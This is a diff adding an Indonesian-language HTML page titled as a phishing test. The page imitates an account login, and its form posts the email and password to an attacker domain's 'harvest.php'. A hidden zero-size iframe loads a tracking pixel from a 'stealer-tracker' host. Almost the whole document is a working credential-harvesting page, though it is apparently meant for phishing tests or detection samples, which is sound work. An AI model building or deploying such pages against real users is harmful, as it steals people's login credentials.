@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Halaman Login Tiruan (Phishing Test)</title>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Masuk ke Akun Anda</h2>
+    <!-- Form phishing: mengirim kata sandi ke domain eksternal berbahaya -->
+    <form action="http://attacker-server.xyz/harvest.php" method="POST">
+      <label>Email: <input type="text" name="username"></label>
+      <label>Kata Sandi: <input type="password" name="password"></label>
+      <button type="submit">Masuk</button>
+    </form>
+  </div>
+  <!-- Iframe tersembunyi untuk pelacakan atau background loading -->
+  <iframe src="http://stealer-tracker.xyz/pixel" width="0" height="0" style="display: none;"></iframe>
+</body>
+</html>
